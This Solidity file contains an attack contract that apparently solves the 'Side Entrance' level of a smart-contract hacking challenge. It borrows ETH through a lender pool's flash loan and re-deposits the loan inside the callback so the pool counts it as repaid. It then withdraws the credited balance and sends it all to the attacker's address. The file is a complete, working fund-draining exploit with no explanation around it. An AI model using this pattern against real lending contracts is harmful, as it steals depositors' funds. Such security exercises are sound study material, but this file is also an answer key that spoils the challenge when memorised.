// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../side-entrance/SideEntranceLenderPool.sol";


contract SideEntranceAttack{
    SideEntranceLenderPool public immutable pool;
    address payable immutable owner;

    constructor(address  _poolAddress){
        pool = SideEntranceLenderPool(_poolAddress);
        owner = payable(msg.sender);
    }
    
    function attack(uint256 _amount) public{
        pool.flashLoan(_amount);
        pool.withdraw();
        
    }

    function execute() public payable{
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable{
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}